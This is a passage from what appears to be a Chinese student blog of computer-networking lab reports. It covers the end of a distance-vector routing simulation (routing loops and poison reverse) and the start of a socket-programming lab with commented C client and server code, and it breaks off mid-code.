<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217223459474.png" alt="image-20191217223459474" style="zoom: 80%;"></p>
<p>对照网络拓扑图后，验证收敛正确</p>
<div style="page-break-after: always;"></div>

<h2 id="任务3：制造路由回路"><a href="#任务3：制造路由回路" class="headerlink" title="任务3：制造路由回路"></a>任务3：制造路由回路</h2><h3 id="任务要求-2"><a href="#任务要求-2" class="headerlink" title="任务要求"></a>任务要求</h3><p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217223818134.png" alt="image-20191217223818134"></p>
<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>开启C、B、A三台虚拟机，分别运行shell脚本</p>
<p>注意：运行shell脚本顺序C必须在B前面，否则无法观察到路由回路效果（这是因为DV路由算法中若自己的路由表项的某一目的路由的下一跳为邻居X，则直接用邻居X发来的路由表项进行更新而不进行比较，因此要让B赶在C之前根据C发来的路由表替换关于目的路由A的信息，所以C要在B前启动）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">sh 路由器名<span class="number">2.</span>sh</span><br></pre></td></tr></table></figure></div>
<p>收敛后结果如下：</p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218135134639.png" alt="image-20191218135134639" style="zoom:80%;"></p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217232531819.png" alt="image-20191217232531819" style="zoom:80%;"></p>
<p>在B中输入如下命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">linkdown <span class="number">192.168</span><span class="number">.126</span><span class="number">.65</span> <span class="number">20000</span></span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218145534403.png" alt="image-20191218145534403" style="zoom: 80%;"></p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218135250317.png" alt="image-20191218135250317"></p>
<p>观察可发现B、C之间产生了路由回路</p>
<div style="page-break-after: always;"></div>

<h2 id="任务4：解决路由回路"><a href="#任务4：解决路由回路" class="headerlink" title="任务4：解决路由回路"></a>任务4：解决路由回路</h2><h3 id="任务要求-3"><a href="#任务要求-3" class="headerlink" title="任务要求"></a>任务要求</h3><p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217233425091.png" alt="image-20191217233425091"></p>
<h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>此任务需修改DVroute.py代码</p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217233716412.png" alt="image-20191217233716412"></p>
<p>保存后同任务三一样进行相应操作</p>
<p>收敛后结果如下：</p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218135346377.png" alt="image-20191218135346377"></p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217225910354.png" alt="image-20191217225910354" style="zoom:80%;"></p>
<p>在B中输入如下命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">linkdown <span class="number">192.168</span><span class="number">.126</span><span class="number">.65</span> <span class="number">20000</span></span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217230234180.png" alt="image-20191217230234180" style="zoom: 67%;"></p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218135504675.png" alt="image-20191218135504675"></p>
<p>可以发现不产生路由回路</p>
<h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><h3 id="任务要求-4"><a href="#任务要求-4" class="headerlink" title="任务要求"></a>任务要求</h3><p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191217233959752.png" alt="image-20191217233959752"></p>
<h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><p>查阅<a href="https://www.rfc-editor.org/rfc/rfc1058.html">RFC1058</a>，发现如下一段话:</p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218125345015.png" alt="image-20191218125345015"></p>
<p>意思是逆向毒化只能杜绝仅涉及两个网关的回路生成，而不能杜绝涉及三个网关之间的互相欺骗而导致的回路生成。</p>
<p>以下作者制造一个涉及三个路由器的路由回路:</p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218130858417.png" alt="image-20191218130858417"></p>
<p>开启C、B、D、A四台虚拟机，逆向毒化设置为开启状态，分别运行shell脚本</p>
<p>注意：运行shell脚本顺序应是C、B、D、A，否则无法观察到路由回路效果</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">sh 路由器名<span class="number">3.</span>sh</span><br></pre></td></tr></table></figure></div>
<p>收敛后结果如下：</p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218135557790.png" alt="image-20191218135557790"></p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218135632226.png" alt="image-20191218135632226"></p>
<p>在B中输入如下命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">linkdown <span class="number">192.168</span><span class="number">.126</span><span class="number">.65</span> <span class="number">20000</span></span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218135740347.png" alt="image-20191218135740347"></p>
<p><img src="/images/loading.gif" data-original="/posts/ef2e418b/image-20191218135846396.png" alt="image-20191218135846396"></p>
<p>可以观察到B、C、D之间产生一个路由回路</p>
<p>之所以逆向毒化技术无法杜绝回路生成，是因为其定义——若向邻居X发送的路由表项中某一项的下一跳是邻居X,则将跳数设为不可达。因此其只能杜绝仅涉及两个网关的路由回路，而对于最佳路径上的下一跳是某个邻居的邻居，当有坏消息，则可能造成三个网关的互相欺骗而形成路由回路。</p>
<div style="page-break-after: always;"></div>

<h1 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h1><p>  本次实验是对DV路由算法的仿真，算法不算困难，在实验三socket编程实验中对聊天室程序的server.py做进一步修改即可完成实验。笔者通过继承socket.socket类生成一个Router类，方便对各项函数进行联系和管理。此次实验十分有趣，加深了我对路由算法的理解和认识，以及进一步熟练掌握python编程。另外，遗憾的是由于时间有限，笔者本次只实现了更新定时器一个功能，对于其他定时器功能，还需笔者对RFC和路由算法做进一步了解后方可实现。</p>
]]></content>
      <categories>
        <category>计算机网络通信实验</category>
      </categories>
  </entry>
  <entry>
    <title>计网实验——Socket编程</title>
    <url>/posts/865a19fa/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ul>
<li>掌握TCP和UDP协议主要特点和工作原理</li>
<li>理解socket的基本概念和工作原理</li>
<li>编程实现socket网络通信（C++ &amp; Python）<a id="more"></a></li>
</ul>
<h1 id="实验内容与分析"><a href="#实验内容与分析" class="headerlink" title="实验内容与分析"></a>实验内容与分析</h1><p>实验环境</p>
<p>CentOS 7.7 + Python3.6.8<br></p>
<h2 id="任务1：实现字符串逆序回送"><a href="#任务1：实现字符串逆序回送" class="headerlink" title="任务1：实现字符串逆序回送"></a>任务1：实现字符串逆序回送</h2><h3 id="任务要求："><a href="#任务要求：" class="headerlink" title="任务要求："></a>任务要求：</h3><p><img src="/images/loading.gif" data-original="/posts/865a19fa/image-20200322211802446.png" alt="image-20200322211802446"></p>
<h3 id="Solution-①"><a href="#Solution-①" class="headerlink" title="Solution ①:"></a>Solution ①:</h3><h4 id="1-客户机的源代码client-c"><a href="#1-客户机的源代码client-c" class="headerlink" title="(1) 客户机的源代码client.c"></a>(1) 客户机的源代码client.c</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;error.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="comment">/* 不接收换行符的fgets()函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_fgets</span><span class="params">(<span class="keyword">char</span> data[], <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fgets(data, count, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="comment">/* 找出data中的"\n" */</span></span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">find</span> = <span class="built_in">strchr</span>(data, <span class="string">'\n'</span>);</span><br><span class="line">    <span class="comment">/* 截取换行符前的字符串 */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">find</span>)</span><br><span class="line">        *<span class="built_in">find</span> = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> client_sock;</span><br><span class="line">    errno = <span class="number">0</span>; </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server_addr</span>;</span></span><br><span class="line">	<span class="keyword">char</span> send_msg[<span class="number">255</span>];</span><br><span class="line">	<span class="keyword">char</span> recv_msg[<span class="number">255</span>];</span><br><span class="line">	<span class="keyword">char</span> stop_word[]=<span class="string">"bye"</span>;</span><br><span class="line">	<span class="keyword">int</span> is_esc;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* 创建socket */</span></span><br><span class="line">    <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	函数原型:int socket(int family, int type, int protocol); </span></span><br><span class="line"><span class="comment">	参数：</span></span><br><span class="line"><span class="comment">    family：协议族。实验用AF_INET</span></span><br><span class="line"><span class="comment">    type：socket类型。常见有SOCK_STREAM、SOCK_DGRAM、SOCK_RAW等</span></span><br><span class="line"><span class="comment">    protocol：具体协议。0表示默认协议</span></span><br><span class="line"><span class="comment">	返回值:</span></span><br><span class="line"><span class="comment">	成功：返回一个新建的socket，用于数据传输</span></span><br><span class="line"><span class="comment">    失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">    *************************************************/</span></span><br><span class="line">	client_sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (errno)</span><br><span class="line">    &#123;</span><br><span class="line">		perror(<span class="string">"创建socket失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* 指定服务器地址 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 用于socket创建通信连接的类型，这里就是ipv4地址类型的通信连接可用 */</span></span><br><span class="line">	server_addr.sin_family = AF_INET;</span><br><span class="line">    <span class="comment">/* 整型变量从主机字节顺序转变成网络字节顺序：Big-Endian */</span></span><br><span class="line">	server_addr.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">    <span class="comment">/* 将点分十进制的IP地址转化为无符号长整数型数的网络字节序 */</span></span><br><span class="line">	server_addr.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]); </span><br><span class="line">    <span class="comment">/* 进行零填充 */</span></span><br><span class="line">	<span class="built_in">memset</span>(server_addr.sin_zero, <span class="number">0</span>, <span class="keyword">sizeof</span>(server_addr.sin_zero)); </span><br><span class="line">    <span class="keyword">if</span> (errno)</span><br><span class="line">    &#123;</span><br><span class="line">		perror(<span class="string">"指定服务器地址失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* 连接服务器 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	函数原型: int connect(int sockfd, const struct sockaddr *addr, int addrlen); </span></span><br><span class="line"><span class="comment">	参数：</span></span><br><span class="line"><span class="comment">	sockfd：用于发起连接的socket的描述符</span></span><br><span class="line"><span class="comment">    addr：服务器地址。此处为指向通用地址结构的指针，使用时，要进行强制类型转换</span></span><br><span class="line"><span class="comment">    addrlen：服务器地址结构大小。可使用sizeof自动计算</span></span><br><span class="line"><span class="comment">	返回值：</span></span><br><span class="line"><span class="comment">    成功：返回0</span></span><br><span class="line"><span class="comment">    失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">    *************************************************/</span></span><br><span class="line">	<span class="built_in">connect</span>(client_sock, (struct sockaddr *)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">    <span class="keyword">if</span> (errno)</span><br><span class="line">    &#123;</span><br><span class="line">		perror(<span class="string">"连接服务器失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* 发送消息 */</span></span><br><span class="line">        </span><br><span class="line">        is_esc=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Myself: "</span>);</span><br><span class="line">		my_fgets(send_msg, <span class="number">256</span>);</span><br><span class="line">        <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">		函数原型: int send(int sockfd, const void *buf, int len, int flags); </span></span><br><span class="line"><span class="comment">		参数：</span></span><br><span class="line"><span class="comment">		sockfd：用于发送数据的socket的描述符</span></span><br><span class="line"><span class="comment">		buf：指向数据的指针</span></span><br><span class="line"><span class="comment">		len：发送数据大小</span></span><br><span class="line"><span class="comment">		flags：额外选项。本次实验设为0</span></span><br><span class="line"><span class="comment">		返回值：</span></span><br><span class="line"><span class="comment">		成功：返回发送的数据大小</span></span><br><span class="line"><span class="comment">		失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">		*************************************************/</span></span><br><span class="line">		send(client_sock, send_msg, <span class="built_in">strlen</span>(send_msg), <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (errno)</span><br><span class="line">		&#123;</span><br><span class="line">			perror(<span class="string">"发送消息失败"</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(send_msg); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(send_msg[i] == <span class="number">27</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				is_esc = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">/* 如果发送消息是bye或者含有ESC就退出 */</span> </span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(send_msg,stop_word) == <span class="number">0</span> || is_esc )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">/* 接收并显示消息 */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 接收数组置零 */</span></span><br><span class="line">		<span class="built_in">memset</span>(recv_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_msg));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">		函数原型: int recv(int sockfd, void *buf, int len, int flags); </span></span><br><span class="line"><span class="comment">		参数：</span></span><br><span class="line"><span class="comment">		sockfd：用于接收数据的socket的描述符</span></span><br><span class="line"><span class="comment">		buf：指向数据的指针</span></span><br><span class="line"><span class="comment">		len：接收数据大小</span></span><br><span class="line"><span class="comment">		flags：额外选项。本次实验设为0</span></span><br><span class="line"><span class="comment">		返回值：</span></span><br><span class="line"><span class="comment">		成功：返回接收的数据大小</span></span><br><span class="line"><span class="comment">		失败：如果对方已关闭连接，返回0；其他错误返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">		*************************************************/</span></span><br><span class="line">		<span class="keyword">if</span> (recv(client_sock, recv_msg, <span class="keyword">sizeof</span>(recv_msg), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"Connection interrupted\n"</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Server: %s\n"</span>, recv_msg);</span><br><span class="line">		<span class="keyword">if</span> (errno)</span><br><span class="line">		&#123;</span><br><span class="line">			perror(<span class="string">"发送消息失败"</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* 关闭socket */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">	函数原型: int close(int sockfd); </span></span><br><span class="line"><span class="comment">	参数：</span></span><br><span class="line"><span class="comment">	sockfd：要关闭的socket的描述符</span></span><br><span class="line"><span class="comment">	返回值：</span></span><br><span class="line"><span class="comment">	成功：返回0</span></span><br><span class="line"><span class="comment">	失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	<span class="built_in">close</span>(client_sock);</span><br><span class="line">	<span class="keyword">if</span> (errno)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">"关闭socket失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="2-服务器的源代码server-c"><a href="#2-服务器的源代码server-c" class="headerlink" title="(2) 服务器的源代码server.c"></a>(2) 服务器的源代码server.c</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;error.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="comment">/* 字符串逆序函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strrev</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="keyword">char</span> *p1, *p2;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! str || ! *str)</span><br><span class="line">		  <span class="keyword">return</span> str;</span><br><span class="line">      <span class="keyword">for</span> (p1 = str, p2 = str + <span class="built_in">strlen</span>(str) - <span class="number">1</span>; p2 &gt; p1; ++p1, --p2)</span><br><span class="line">	  &#123;</span><br><span class="line">		  *p1 ^= *p2;</span><br><span class="line">		  *p2 ^= *p1;</span><br><span class="line">		  *p1 ^= *p2;</span><br><span class="line">	  &#125;</span><br><span class="line">	  <span class="comment">/* UTF-8汉字一个是三个字节，进行相应逆序转化 */</span></span><br><span class="line">	  <span class="keyword">for</span> (p2 = str + <span class="built_in">strlen</span>(str) - <span class="number">1</span>; p2 &gt;= str; --p2)</span><br><span class="line">	  &#123;</span><br><span class="line">		  <span class="keyword">if</span> (*p2&amp;<span class="number">0x80</span>)<span class="comment">//最高位为1</span></span><br><span class="line">		  &#123;</span><br><span class="line">			  </span><br><span class="line">			  *p2 ^= *(p2<span class="number">-2</span>);</span><br><span class="line">			  *(p2<span class="number">-2</span>) ^= *p2;</span><br><span class="line">			  *p2 ^= *(p2<span class="number">-2</span>);</span><br><span class="line">			  p2 = p2<span class="number">-2</span>;</span><br><span class="line">		  &#125;</span><br><span class="line">	  &#125;</span><br><span class="line">      <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> server_sock_listen, server_sock_data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server_addr</span>;</span></span><br><span class="line">	<span class="keyword">char</span> recv_msg[<span class="number">255</span>];</span><br><span class="line">	<span class="keyword">char</span> stop_word[]=<span class="string">"bye"</span>;</span><br><span class="line">	<span class="keyword">int</span> is_esc;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 创建socket */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">    函数原型: int socket(int family, int type, int protocol); </span></span><br><span class="line"><span class="comment">	参数：</span></span><br><span class="line"><span class="comment">	family：协议族。实验用AF_INET</span></span><br><span class="line"><span class="comment">    type：socket类型。常见有SOCK_STREAM、SOCK_DGRAM、SOCK_RAW等</span></span><br><span class="line"><span class="comment">    protocol：具体协议。0表示默认协议</span></span><br><span class="line"><span class="comment">	返回值:</span></span><br><span class="line"><span class="comment">	成功：返回一个新建的socket，用于数据传输</span></span><br><span class="line"><span class="comment">    失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">    *************************************************/</span></span><br><span class="line">	server_sock_listen = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (errno)</span><br><span class="line">    &#123;</span><br><span class="line">		perror(<span class="string">"创建socket失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 指定服务器地址 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 用于socket创建通信连接的类型，这里就是ipv4地址类型的通信连接可用 */</span></span><br><span class="line">	server_addr.sin_family = AF_INET;</span><br><span class="line">    <span class="comment">/* 整型变量从主机字节顺序转变成网络字节顺序：Big-Endian */</span></span><br><span class="line">	server_addr.sin_port = htons(atoi(argv[<span class="number">1</span>]));</span><br><span class="line">    <span class="comment">/* INADDR_ANY表示本机所有IP地址 */</span></span><br><span class="line">	server_addr.sin_addr.s_addr = htonl(INADDR_ANY); </span><br><span class="line">    <span class="comment">/* 进行零填充 */</span></span><br><span class="line">	<span class="built_in">memset</span>(&amp;server_addr.sin_zero, <span class="number">0</span>, <span class="keyword">sizeof</span>(server_addr.sin_zero)); </span><br><span class="line">	<span class="keyword">if</span> (errno)</span><br><span class="line">    &#123;</span><br><span class="line">		perror(<span class="string">"指定服务器地址失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 绑定socket与地址 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">    函数原型: int bind(int sockfd, const struct sockaddr *addr, int addrlen); </span></span><br><span class="line"><span class="comment">	参数：</span></span><br><span class="line"><span class="comment">	sockfd：要绑定的socket的描述符</span></span><br><span class="line"><span class="comment">	addr：要绑定的地址。此处为指向通用地址结构的指针，使用时，要进行强制类型转换</span></span><br><span class="line"><span class="comment">	addrlen：地址结构大小。可使用sizeof自动计算</span></span><br><span class="line"><span class="comment">	返回值：</span></span><br><span class="line"><span class="comment">	成功：返回0</span></span><br><span class="line"><span class="comment">	失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">	*************************************************/</span></span><br><span class="line">	bind(server_sock_listen, (struct sockaddr *)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">	<span class="keyword">if</span> (errno)</span><br><span class="line">    &#123;</span><br><span class="line">		perror(<span class="string">"绑定socket与地址失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* 监听socket */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">		函数原型：int listen(int sockfd, int backlog); </span></span><br><span class="line"><span class="comment">		参数：</span></span><br><span class="line"><span class="comment">		sockfd：要监听的socket的描述符</span></span><br><span class="line"><span class="comment">		backlog：该socket上完成队列的最大长度。完成队列是指已完成三次握手(established)，但尚未被服务器接受（accept）的客户机</span></span><br><span class="line"><span class="comment">		返回值：</span></span><br><span class="line"><span class="comment">		成功：返回0</span></span><br><span class="line"><span class="comment">		失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">		*************************************************/</span></span><br><span class="line">		<span class="built_in">listen</span>(server_sock_listen, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Server is listening....\n"</span>);</span><br><span class="line">		<span class="keyword">if</span> (errno)</span><br><span class="line">		&#123;</span><br><span class="line">			perror(<span class="string">"监听socket失败\n"</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">/* 接收并显示消息 */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">		函数原型：int accept(int sockfd, struct sockaddr *addr, int *addrlen); </span></span><br><span class="line"><span class="comment">		参数：</span></span><br><span class="line"><span class="comment">		sockfd：用于接受连接的socket的描述符</span></span><br><span class="line"><span class="comment">		addr：客户机地址。此处为指向通用地址结构的指针，使用时，要进行强制类型转换。如果不关心客户机地址，可以设为NULL</span></span><br><span class="line"><span class="comment">		addrlen：客户机地址结构大小。如果不关心，可以和addr一起设为NULL</span></span><br><span class="line"><span class="comment">		返回值：</span></span><br><span class="line"><span class="comment">		成功：返回一个新建的socket，用于数据传输</span></span><br><span class="line"><span class="comment">		失败：返回-1，并在全局变量errno中记录错误类型</span></span><br><span class="line"><span class="comment">		*************************************************/</span></span><br><span class="line">		server_sock_data = accept(server_sock_listen, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//服务器接受连接</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Accept......\n"</span>);</span><br><span class="line">		<span class="keyword">if</span> (errno)</span><br><span class="line">		&#123;</span><br><span class="line">			perror(<span class="string">"服务器接受连接失败\n"</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	